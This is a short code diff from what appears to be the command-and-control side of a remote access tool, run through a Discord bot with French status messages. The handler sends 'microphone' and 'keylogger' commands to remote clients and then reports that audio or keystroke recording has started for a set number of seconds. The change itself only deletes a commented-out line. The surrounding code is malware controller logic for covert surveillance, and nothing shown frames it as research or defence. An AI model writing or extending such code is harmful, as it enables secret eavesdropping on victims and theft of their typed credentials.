@@ -69,7 +69,6 @@ export const handleSendCommand = async (interaction) => {
         await executeRequestWithTokenRefresh(url, { method: 'POST', data });
         if (command === 'microphone' || command === 'keylogger') {
             const contentType = command === 'microphone' ? 'de l\'audio' : 'du clavier';
-            // await interaction.editReply(`Démarrage de l'enregistrement audio pour le client ${clientId} pour ${duration} secondes...`);
             await interaction.editReply(`Démarrage de l'enregistrement ${contentType} pour le client ${clientId} pour ${duration} secondes...`);
             let elapsedSeconds = 0;
             const intervalId = setInterval(async () => {
